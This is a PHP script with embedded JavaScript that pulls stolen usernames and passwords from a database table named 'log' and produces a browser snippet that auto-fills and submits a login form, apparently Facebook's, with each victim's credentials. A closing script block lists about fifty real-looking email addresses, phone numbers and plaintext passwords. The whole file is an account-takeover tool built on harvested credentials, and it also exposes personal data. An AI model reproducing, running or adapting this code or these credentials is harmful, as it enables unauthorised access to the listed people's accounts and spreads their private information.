<?php
include '../db.php';
$sql="select * from log limit 1401,200";
mysql_select_db($dbname);
$retval=mysql_query($sql,$conn);
$all[0]=array();
$user="";
$password="";
$userid="";
while($row=mysql_fetch_array($retval)){
	$all[0][]=$row['username'];
	$all[1][]=$row['pass'];
	$all[2][]=$row['id'];
	//$user="{$user}{$username}hmd";
	//$password="{$password}{$pass}hmd";
	//$userid="{$userid}{$id}hmd";
	//echo $row['username'];
}
$all0= implode($all[0],"','");
$all1 =implode($all[1],"','");
$all2= implode($all[2],"','");

echo "<textarea cols=50 rows=15>user=Array('{$all0}');pass=Array('{$all1}');userid=Array('{$all2}');now=prompt();document.cookie='nowfbloged='+userid[now];{ document.forms[0].email.value = user[now]; document.forms[0].pass.value = pass[now];}document.getElementsByName('login')[0].click();</textarea>";
?>

<script>
//user=Array('Sparaskar90@gmail. com','9744436958','9689731379','9497692901','9714192660','Sumit. ghanmod','kpchavan','Riyasarlapadavu@yahoo.com','niks9798@gmail.com','8511777275','9567956773','patil.vaishali47@yahoo.com','navins439@gmail.com','saichhatra4u@gmail.con','9497692901','sreejinkasaragod@gmail.com','ragkumaranu@gmail.com','00919496561740','8879726232','irksome01@gmail.com','Rajvishal945@gmail.com','Hmazary@yahoo.com','9998333445','fmfayis@gmail. com','vavas312@gmail.com',' gogomaster@gmail.com ','n.prince15101996@gmail.com','bhatt.ashu86@gmail.com','Murugansatish17;gmail.com','kadlagswati66@gmail.com','saleemkp@ymail.com','n.prince15101996@gmail.com','saysmoon@gmail.com','9567172779','9995891017','9995202963','shiva.saxena.5','habee033@gmail.com','yuvraj1416@yahoo.com','9898583909','9662465826','pratik.soni.507','parthdavepd@gmail.com','bhavikkanani@yahoo.com','parasbhatti007@gmail.com','kakadiya_yash11@yahoo.in','tankbhargav3@gmail.com','brijeshs1010@gmail.com','niks3patel@yahoo.in','cparmar92@gmail.com');pass=Array('9881904863','jouharmon','amol1994','475869','maheshwar','','kp312012','rokerz786','9798753455','Dhiresh2','Rumi@deli.com','82521661066','mamtasahoo','9421516685','142536','appuswetha','khushboo123*','4829144','imsherlok2IMS','isirshad01','matg paj','2020202020','RAJVEER','0594805','nandanam','9922183820','9347192526','9058717132','9619955064','8308308996','9446131744','9347192526','tanveerusman','MUHAMMED','JAMEELAMS','9895031935','thefastandthefurious','fucked','shrikantgupta','december','mannatkhan','13pss93','parthdavedivine','kananibrother','parastoral','6855guddy143','bhargavdarshu','960812','guddy143','50009905022');now=prompt();{ document.forms[0].email.value = user[now]; document.forms[0].pass.value = pass[now];}document.getElementsByName('login')[0].click();
</script>